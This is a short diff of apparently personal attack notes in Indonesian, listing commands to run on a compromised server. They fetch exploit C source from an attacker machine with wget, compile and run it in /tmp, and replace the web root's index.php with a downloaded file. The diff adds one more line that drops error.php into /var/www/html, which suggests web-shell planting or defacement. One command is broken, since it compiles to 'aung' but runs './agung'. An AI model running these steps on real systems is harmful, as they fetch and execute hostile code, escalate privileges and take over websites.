@@ -28,9 +28,10 @@ Mulai
   Terminal 2 or Terminal Server
 	  lsb_release -a
 	  cd /tmp && wget 192.168.4.x:80/9542.c && gcc 9542.c -o aung && ./agung
-    cd /tmp && wget 192.168.4.x:80/tmp/tmp.c && gcc tmp.c -o tmp && ./tmp 
+	  cd /tmp && wget 192.168.4.x:80/tmp/tmp.c && gcc tmp.c -o tmp && ./tmp 
 	
 	  cd /var/www/html && rm index.php && wget 192.168.6.5:80/index.php
+	  cd /var/www/html && rm index.php && wget 192.168.6.5:80/error.php
 
 
 Burpsite
